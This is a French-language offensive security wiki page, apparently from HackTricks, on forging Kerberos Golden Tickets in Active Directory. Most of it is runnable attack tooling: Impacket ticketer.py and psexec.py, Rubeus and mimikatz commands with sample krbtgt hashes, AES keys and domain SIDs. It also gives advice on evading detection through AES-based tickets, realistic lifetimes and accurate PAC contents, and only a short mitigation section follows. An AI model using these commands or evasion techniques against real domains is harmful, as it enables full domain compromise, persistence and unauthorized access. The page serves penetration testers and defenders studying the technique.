# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Une attaque **Golden Ticket** consiste à **créer un Ticket Granting Ticket (TGT) légitime usurpant l'identité de n'importe quel utilisateur** grâce à l'utilisation du **hash NTLM du compte Active Directory (AD) krbtgt**. Cette technique est particulièrement avantageuse, car elle **permet d'accéder à n'importe quel service ou machine** du domaine en tant que l'utilisateur usurpé. Il est essentiel de se rappeler que les **identifiants du compte krbtgt ne sont jamais mis à jour automatiquement**.<sup>[[1]](#references)</sup>

Pour **obtenir le hash NTLM** du compte krbtgt, différentes méthodes peuvent être utilisées. Il peut être extrait du **processus Local Security Authority Subsystem Service (LSASS)** ou du **fichier NT Directory Services (NTDS.dit)** situé sur n'importe quel Domain Controller (DC) du domaine. En outre, **exécuter une attaque DCsync** constitue une autre stratégie pour obtenir ce hash NTLM, notamment à l'aide du **module lsadump::dcsync** de Mimikatz ou du **script secretsdump.py** d'Impacket. Il est important de souligner que la réalisation de ces opérations **nécessite généralement des privilèges d'administrateur de domaine ou un niveau d'accès similaire**.<sup>[[2]](#references)</sup>

Bien que le hash NTLM constitue une méthode viable à cette fin, il est **fortement recommandé** de **forger les tickets à l'aide des clés Kerberos Advanced Encryption Standard (AES) (AES128 et AES256)** pour des raisons de sécurité opérationnelle. Cela est encore plus important dans les domaines modernes, car **l'utilisation de RC4 est progressivement abandonnée** et se distingue beaucoup plus clairement dans la télémétrie Kerberos.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Notes modernes sur la création de tickets

Lorsque cela est possible, **interrogez d'abord LDAP et SYSVOL**, puis forgez le ticket en utilisant la véritable stratégie de domaine et les valeurs PAC de l'utilisateur au lieu de les inventer manuellement&nbsp;:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` demande au DC les données utilisateur, groupe, NetBIOS et de stratégie utilisées pour construire un PAC plus réaliste.
- `/printcmd` affiche une ligne de commande offline contenant les champs PAC récupérés, ce qui est utile si vous souhaitez ensuite forger le même ticket sans accéder de nouveau à LDAP.
- `/extendedupndns` ajoute les nouveaux éléments `UpnDns` du PAC contenant le `samAccountName` et le SID du compte.
- `/oldpac` supprime les nouveaux tampons PAC `Requestor` et `Attributes` ; cette option est principalement utile pour les tests de compatibilité avec d’anciens environnements, et non pour le tradecraft par défaut.

Depuis Linux, les versions récentes d’Impacket prennent également en charge l’ajout des nouvelles structures PAC et la définition d’une période de validité réaliste :
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` est exprimé en **heures**. La valeur par défaut est de **10 ans**, ce qui est bruyant.
- `-extra-pac` ajoute les informations PAC `UPN_DNS` plus récentes.
- `-old-pac` force la structure PAC legacy.
- `-extra-sid` est utile lorsque le PAC nécessite des SID supplémentaires (par exemple, dans les scénarios d’escalade d’un enfant vers le parent, couverts dans [SID-History Injection](sid-history-injection.md)).

**Une fois** le **Golden Ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)** et exécuter des services ainsi que WMI. Vous pouvez donc utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble impossible d’obtenir un shell via winrm).

### Contourner les détections courantes

Les méthodes les plus fréquentes pour détecter un Golden Ticket consistent à **inspecter le trafic Kerberos** sur le réseau. Par défaut, Mimikatz **signe le TGT pour 10 ans**, ce qui apparaîtra comme anormal dans les requêtes TGS ultérieures effectuées avec celui-ci.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de début, la durée et le nombre maximal de renouvellements (tous exprimés en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n'est pas journalisée dans les événements 4769 ; vous ne trouverez donc pas cette information dans les journaux d'événements Windows. Cependant, vous pouvez corréler le fait de **voir des événements 4769 sans événement 4768 préalable**. Il **n'est pas possible de demander un TGS sans TGT** et, s'il n'existe aucun enregistrement indiquant qu'un TGT a été émis, nous pouvons en déduire qu'il a été forgé hors ligne.

Dans les **versions plus récentes de Windows**, les IDs d'événement **4768** et **4769** exposent également une télémétrie bien plus détaillée sur les **types de chiffrement**. Un TGT/TGS forgé utilisant **RC4 (`0x17`)** dans un domaine où `krbtgt`, les clients et les services possèdent déjà des clés AES est beaucoup plus facile à détecter qu'il ne l'était il y a quelques années. C'est une raison supplémentaire de privilégier les **Golden Tickets reposant sur AES** et de reproduire aussi fidèlement que possible la politique Kerberos normale du domaine.

Un autre problème d'OPSEC concerne la **fidélité du PAC**. Les tickets contenant des appartenances à des groupes impossibles, des tampons PAC plus récents manquants ou des métadonnées de compte qui ne correspondent pas à LDAP sont plus faciles à détecter lorsque les défenseurs valident le contenu du PAC par rapport aux données AD. Si vous avez besoin d'un TGT qui semble avoir réellement été émis par un DC, consultez :

{{#ref}}
diamond-ticket.md
{{#endref}}

Il existe également des **limites environnementales** à la persistance. Le compte `krbtgt` conserve un **historique de mots de passe de 2**, de sorte qu'un TGT forgé peut rester valide après la **première** réinitialisation de `krbtgt` s'il a été signé avec la clé précédente. C'est pourquoi les défenseurs invalident les Golden Tickets en **réinitialisant `krbtgt` deux fois** et en attendant au moins la durée de vie maximale des tickets du domaine entre les réinitialisations.<sup>[[3]](#references)</sup>

Pour **contourner cette détection**, consultez les diamond tickets.

### Atténuation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Les défenseurs peuvent également mettre en place d'autres petites mesures, comme **déclencher une alerte sur les événements 4769 concernant les utilisateurs sensibles**, tels que le compte administrateur de domaine par défaut, et déclencher une alerte sur **l'utilisation de RC4 pour `krbtgt`** dans les domaines qui émettent normalement des tickets AES.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
